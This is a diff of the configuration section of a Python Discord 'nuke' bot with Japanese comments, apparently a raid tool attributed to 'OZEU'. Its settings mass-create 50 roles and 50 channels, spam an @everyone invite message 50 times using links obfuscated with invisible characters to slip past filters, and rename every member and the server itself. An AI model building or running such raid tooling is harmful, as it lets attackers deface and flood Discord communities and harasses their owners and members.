@@ -9,9 +9,9 @@ import discord
 from discord.ext import commands
 from flask import Flask, jsonify
 
-# ------------------- ユーザー設定 -------------------
-TOKEN = os.environ.get("DISCORD_TOKEN")
-PREFIX = "!"
+# ------------------- 色々 -------------------
+TOKEN = os.environ.get("DISCORD_TOKEN") # tokenは直でも可
+PREFIX = "!"                            # !nukeの!を変えられる
 INTENTS = discord.Intents.default()
 INTENTS.guilds = True
 INTENTS.messages = True
@@ -24,12 +24,12 @@ ROLE_COUNT     = 50               # 作成数
 CHANNEL_BASE   = "ozeu-nuke"    # チャンネル名ベース
 CHANNEL_COUNT  = 50               # 作成数
 REPEAT_MESSAGE = "# @everyone\n# Raid by OZEU. join now\n# おぜうの集いに参加！\n# https://\ptb．discord．com/../oze/../invite/ozeuozeu [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/yNx4Me2) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1341829977850646668/1353001058405978172/IMB_DZBN6p.gif?ex=67e00fed&is=67debe6d&hm=b07d1cf915c35fa1871b655f91d3738eba09ea05683a1abf5b883b0598f3b92a&) [︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567562863939726/GtZ9HYjbkAA9bPR.webp?ex=684f4334&is=684df1b4&hm=76921f9aff9c6f4b90feaf662c07ca2bb48257ef2bb7fdf39fb5a6df94740967&) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567672725340230/Gri2PLOboAI8ZRV.jpeg?ex=684f434e&is=684df1ce&hm=c28e7c872cdcb1420d8f565211714fa33bef522a879eca292c280439173a9ea2&) [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/NbBGFcf)"  # 送信メッセージ
-REPEAT_COUNT   = 50               # メッセージ送信回数
+REPEAT_COUNT   = 50               # メッセージ送信回数　↑メッセージ内容
 
 # --- サブ作業 ---
 CHANGE_NICKNAMES = True          # Trueならニックネーム変更
-NICK_BASE        = "おぜう様万歳！"
-NEW_GUILD_NAME   = "おぜう植民地"
+NICK_BASE        = "おぜう様万歳！" # ギルメン名
+NEW_GUILD_NAME   = "おぜう植民地"   #ギルド名
 
 # --- 速度プリセット ---
 # 遅い / 普通 / 速い / 爆速
